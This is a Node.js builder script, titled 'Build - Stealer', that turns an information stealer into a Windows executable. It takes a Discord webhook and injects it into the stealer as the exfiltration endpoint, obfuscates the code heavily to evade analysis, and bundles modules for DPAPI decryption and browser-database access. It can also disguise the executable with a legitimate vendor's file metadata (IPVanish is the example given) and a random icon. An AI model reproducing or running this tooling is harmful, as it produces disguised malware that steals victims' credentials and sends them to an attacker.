console.clear()
process.title = 'Build - Stealer'

import fs from 'fs-extra'
import cfonts from 'cfonts'
import chalk from 'chalk'
import formdata from 'form-data'
import resedit from 'resedit-cli'

const { readFileSync, readdirSync, readJSONSync, outputFileSync, removeSync } = fs
import { join, dirname, basename } from 'path'
import { fileURLToPath } from 'url'
import { execSync } from 'child_process'
import { question, keyInSelect } from 'readline-sync'
import { got } from 'got'
import { obfuscate } from 'js-confuser'
import { exec } from '@yao-pkg/pkg'

const __filename = fileURLToPath(import.meta.url)
const __dirname = dirname(__filename)

cfonts.say('Build', {
  font: 'block',
  align: 'center',
  colors: [
    'red',
    'yellow',
    'green',
    'cyan',
    'blue',
    'magenta'
  ],
  background: 'transparent',
  letterSpacing: 1,
  lineHeight: 1,
  space: false,
  maxLength: '0'
})

///////////////////////////////////////////////////////////////////////////////////////////////////////////

const webhook = question(chalk.bold.yellow('[?] Enter webhook: '))

if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
  console.log(chalk.bold.red('[@] Webhook is invalid or has not been informed.'))
  process.exit(1)
}

try {
  console.log(chalk.bold.black('[#] Validating the webhook'))

  const {
    body
  } = await got({
    responseType: 'json',
    throwHttpErrors: false,
    dnsCache: false,
    url: webhook,
    headers: {
      'Content-Type': 'application/json'
    }
  })

  const {
    token
  } = body || {}

  if (!token) {
    console.log(chalk.bold.red('[@] This webhook is invalid.'))
    process.exit(1)
  } else {
    console.log(chalk.bold.green('[$] The webhook is valid.'))

  }
} catch (error) {
  console.log(chalk.bold.red('[@] An error occurred while validating the webhook.'))
  console.log(error)
  process.exit(1)
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////

const nome = question(chalk.bold.yellow('[?] Enter exe name: '))

if (!nome) {
  console.log(chalk.bold.red('[!] You need to choose a name.'))
  process.exit(1)
}

console.log(chalk.bold.green('[$] Name selected successfully:', nome))

///////////////////////////////////////////////////////////////////////////////////////////////////////////

var useimage = question(chalk.bold.yellow('[?] Would you like to use an icon? (y/n): '))

if (useimage !== 'y' && useimage !== 'n') {
  console.log(chalk.bold.red('[@] Invalid option.'))
  process.exit(1)
}

if (useimage.includes('y')) {
  useimage = ''

  var imagens = readdirSync(join(
    'resources',
    'icon'
  ))

  if (!imagens.length) {
    imagens = question(chalk.bold.yellow('[!] You don\'t have icons, to add icons add them to the icons folder, would you like to generate a random one? (y/n): '))

    if (imagens.includes('y')) {
      imagens = 'random'
    }
  } else {
    const pergunta = keyInSelect([
      ...imagens,
      'Random Icon'
    ], chalk.bold.yellow('[?] Select an icon: '))

    if (imagens.length === pergunta) {
      imagens = 'random'
    }

    if (pergunta === -1) {
      imagens = ''
    }

    if (typeof imagens !== 'string' && pergunta !== -1) {
      imagens = join(
        'resources',
        'icon',
        imagens[pergunta]
      )

      useimage = imagens
    }
  }

  if (imagens === 'random') {
    console.log(chalk.bold.black('[#] Generating a random image with pixlr.'))

    var {
      body
    } = await got({
      responseType: 'json',
      throwHttpErrors: false,
      dnsCache: false,
      url: 'https://pixlr.com/api/image-generator/feeds/recent/1/',
      method: 'get',
      headers: {
        'content-type': 'application/json'
      }
    })

    const {
      docs
    } = body?.data || {}

    if (!docs || !docs.length) {
      console.log(chalk.bold.red('[@] Unable to get an image, the API appears to be down.'))
      process.exit(1)
    } else {
      console.log(chalk.bold.green('[$] Image obtained successfully.'))
    }

    var image = docs[Math.floor(Math.random() * docs.length)]
    image = image.images[0].preview

    console.log(chalk.bold.black('[#] Converting the image to ICO format.'))

    const form = new formdata()

    form.append('file', image)
    form.append('icontype', 1)
    form.append('imagesize[]', '16x16')
    form.append('imagesize[]', '32x32')
    form.append('imagesize[]', '48x48')
    form.append('imagesize[]', '64x64')
    form.append('imagesize[]', '128x128')
    form.append('customsize', '')
    form.append('code', 84000)
    form.append('targetformat', 'ico')
    form.append('filelocation', 'online')
    form.append('oAuthToken', '')
    form.append('legal', 'Our PHP programs can only be used in aconvert.com. We DO NOT allow using our PHP programs in any third-party websites, software or apps. We will report abuse to your server provider, Google Play and App store if illegal usage found!')

    var {
      body
    } = await got({
      responseType: 'json',
      throwHttpErrors: false,
      dnsCache: false,
      url: 'https://s11.aconvert.com/convert/convert11.php',
      method: 'post',
      body: form,
      headers: {
        ...form.getHeaders(),
        Referer: 'https://www.aconvert.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 YaBrowser/25.2.0.0 Safari/537.36'
      }
    })

    const {
      state,
      filename
    } = body || {}

    if (state !== 'SUCCESS') {
      console.log(chalk.bold.red('[@] Unable to convert image, conversion API appears to be down.'))
      process.exit(1)
    } else {
      console.log(chalk.bold.green('[$] Image converted to ICO successfully.'))
    }

    console.log(chalk.bold.black('[#] Saving the image.'))

    var {
      body
    } = await got({
      responseType: 'buffer',
      throwHttpErrors: false,
      dnsCache: false,
      url: 'https://s11.aconvert.com/convert/p3r68-cdx67/' + filename + '-001.ico',
      method: 'get'
    })

    imagens = join(
      'resources',
      'icon',
      filename + '.ico',
    )

    try {
      outputFileSync(imagens, body)
      useimage = imagens

      console.log(chalk.bold.green('[$] Image saved successfully.'))
    } catch (error) {
      console.log(chalk.bold.red('[!] An error occurred while saving the image.'))
      console.log(error)
      process.exit(1)
    }
  }
} else {
  useimage = ''
}

if (useimage) {
  console.log(chalk.bold.green('[$] Icon selected successfully:', basename(useimage)))
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////

var fileinfo = question(chalk.bold.yellow('[?] Would you like to change the executable information? (y/n): '))
  .includes('y')

if (fileinfo) {
  const infons = readdirSync(join(
    'resources',
    'version'
  )).filter(file => file.endsWith('.json'))

  if (!infons.length) {
    fileinfo = question(chalk.bold.yellow('[?] You don\'t have a release configuration, do you want to create one ? (y/n): '))
      .includes('y')

    if (fileinfo) {
      fileinfo = 'new'
    }
  } else {
    fileinfo = keyInSelect([
      ...infons,
      'Create a new'
    ], chalk.bold.cyan('[#] Select the version file you want to use: '))

    if (fileinfo === -1) {
      fileinfo = false
    } else if (fileinfo === infons.length) {
      fileinfo = 'new'
    } else {
      fileinfo = readJSONSync(join(
        'resources',
        'version',
        infons[fileinfo]
      ))
    }
  }

  if (fileinfo === 'new') {
    console.log(chalk.bold.red(`\n[Disclaimer]\n
- It is not mandatory to fill in all fields.
- If you're not sure, just press ENTER to skip the field.
- What is in parentheses is an example of what you can put.\n`))

    var version = {}

    version.companyName = (question(chalk.bold.cyan('[1/8] Company name (IPVanish, a Ziff Davis company): '))) || ''
    version.fileDescription = (question(chalk.bold.cyan('[2/8] File Description (IPVanish): '))) || ''
    version.fileVersion = (question(chalk.bold.cyan('[3/8] File version (4.2.6.358): '))) || ''
    version.internalName = (question(chalk.bold.cyan('[4/8] Internal name (IPVanish.exe): '))) || ''
    version.legalCopyright = (question(chalk.bold.cyan('[5/8] Copyright (\xA9 2019-2024 IPVanish, a Ziff Davis company. All rights reserved.): '))) || ''
    version.originalFileName = (question(chalk.bold.cyan('[6/8] Original filename (IPVanish.exe): '))) || ''
    version.productName = (question(chalk.bold.cyan('[7/8] Product name (IPVanish): '))) || ''
    version.ProductVersion = (question(chalk.bold.cyan('[8/8] Product version (4.2.6.358-a2aa3817): '))) || ''

    fileinfo = version

    outputFileSync(join(
      'resources',
      'version',
      nome + '.json'
    ), JSON.stringify(version, null, 3))
  }
}

if (fileinfo) {
  console.log(chalk.bold.green('[$] File information selected successfully.'))
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////

console.log(chalk.bold.black('[#] Obfuscating the source.'))

var src = readFileSync(join(
  'stealer.js'
), 'utf-8')

src = src.replace('*WEBHOOK*', webhook)

const {
  code
} = await obfuscate(src, {
  astScrambler: true,
  calculator: true,
  compact: true,
  controlFlowFlattening: true,
  customStringEncodings: false,
  deadCode: true,
  dispatcher: true,
  duplicateLiteralsRemoval: true,
  flatten: true,
  globalConcealing: true,
  hexadecimalNumbers: true,
  identifierGenerator: {
    chinese: 1,
    hexadecimal: 1,
    mangled: 1,
    number: 1,
    randomized: 1,
    zeroWidth: 1
  },
  lock: {},
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: true,
  pack: false,
  preserveFunctionLength: true,
  preset: 'high',
  renameGlobals: true,
  renameLabels: true,
  renameVariables: true,
  rgf: true,
  shuffle: true,
  stringCompression: true,
  stringConcealing: true,
  stringEncoding: true,
  stringSplitting: true,
  target: 'node',
  variableMasking: true,
  verbose: false
})

if (!code) {
  console.log(chalk.bold.red('[!] An error occurred while obfuscating the code.'))
  process.exit(1)
}

console.log(chalk.bold.green('[$] Source successfully obfuscated.'))

try {
  console.log(chalk.bold.black('[#] Saving the obfuscated source.'))

  outputFileSync(join(
    'src',
    nome + '.js'
  ), code, {
    recursive: true
  })

  console.log(chalk.bold.green('[+] Obfuscated source saved successfully.'))
} catch (error) {
  console.log(chalk.bold.red('[!] An error occurred while saving the obfuscated source.'))
  console.log(error)
  process.exit(1)
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////

console.log(chalk.bold.black('[#] Preparing package.json.'))

const $package = `{
  "name": "${nome}",
  "version": "1.0",
  "description": "",
  "main": "${nome}.js",
  "bin": "${nome}.js",
  "type": "commonjs",
  "keywords": [],
  "author": "",
  "license": "ISC",
  "dependencies": {
    "@primno/dpapi": "^2.0.1",
    "adm-zip": "^0.5.16",
    "better-sqlite3": "^11.9.1",
    "big-integer": "^1.6.52",
    "discord-webhook-node": "^1.1.8",
    "fast-glob": "^3.3.3",
    "form-data": "^4.0.2",
    "fs-extra": "^11.3.0",
    "got": "^11.8.3",
    "koffi": "^2.10.1",
    "playwright": "^1.51.1"
  },
  "pkg": {
    "assets": [
      "./node_modules/@primno/dpapi/build/Release/dpapi.node",
      "./node_modules/adm-zip/**/*",
      "./node_modules/better-sqlite3/build/Release/better_sqlite3.node",
      "./node_modules/discord-webhook-node/**/*",
      "./node_modules/fast-glob/**/*",
      "./node_modules/form-data/**/*",
      "./node_modules/fs-extra/**/*",
      "./node_modules/got/**/*",
      "./node_modules/playwright/**/*"
    ],
    "scripts": [
      "!./node_modules/playwright-core/lib/server/chromium/appIcon.png"
    ]
  },
  "devDependencies": {
    "node-addon-api": "^8.3.1"
  }
}`

try {
  outputFileSync(join(
    'src',
    'package.json'
  ), $package)

  console.log(chalk.bold.green('[$] package.json created successfully.'))
} catch (error) {
  console.log(chalk.bold.red('[!] An error occurred while creating package.json.'))
  console.log(error)
  process.exit(1)
}

try {
  console.log(chalk.bold.black('[#] Installing dependencies from package.json.'))

  execSync('cd src && pnpm i', {
    shell: false
  })

  console.log(chalk.bold.green('[$] Dependencies installed successfully.'))
} catch (error) {
  console.log(chalk.bold.red('[!] An error occurred while installing dependencies.'))
  console.log(error)
  process.exit(1)
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////

try {
  console.log(chalk.bold.black('[#] Compiling module better-sqlite3, @primno/dpapi and koffi in version 20.'))

  execSync('cd src && cd node_modules/better-sqlite3 && npx node-gyp rebuild --target=20.0.0 && cd .. && cd @primno/dpapi && npx node-gyp rebuild --target=20.0.0 && cd ../../.. && pnpm add koffi', {
    shell: false,
    stdio: 'inherit'
  })

  console.log(chalk.bold.green('[$] Modules compiled successfully to version 20.'))
} catch (error) {
  console.log(chalk.bold.red('[!] An error occurred while compiling the modules.'))
  console.log(error)
  process.exit(1)
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////

try {
  console.log(chalk.bold.black('[#] Creating the executable.'))

  await exec([
    join(__dirname, 'src', nome + '.js'),
    '-C', 'GZip',
    '-t', 'node20-windows-x64',
    '-c', join(__dirname, 'src', 'package.json'),
    '-o', join(__dirname, nome + '.exe')
  ])

  console.log(chalk.bold.green('[$] Executable created successfully.'))
} catch (error) {
  console.log(chalk.bold.red('[!] An error occurred while creating the executable.'))
  console.log(error)
  process.exit(1)
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////

if (useimage) {
  try {
    console.log(chalk.bold.black('[#] Changing executable information.'))

    await resedit({
      'in': `./${nome}.exe`,
      'out': `./${nome}.exe`,
      'definition': {
        'version': fileinfo ? fileinfo : {},
        'icons': [{
          'id': 1,
          'sourceFile': useimage
        }]
      }
    })

    console.log(chalk.bold.green('[$] Executable information changed successfully.'))
  } catch (error) {
    console.log(chalk.bold.red('[!] An error occurred while changing the executable information.'))
    console.log(error)
    process.exit(1)
  }
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////

process.on('exit', () => {
  try {
    console.log(chalk.bold.black('[#] Cleaning the build folder.'))
    removeSync(join(__dirname, 'src'))
    console.log(chalk.bold.green('[$] Build folder cleaned successfully.'))
  } catch (error) {
    console.log(chalk.bold.red('[!] Error cleaning the build folder.'))
    console.log(error)
  }
})

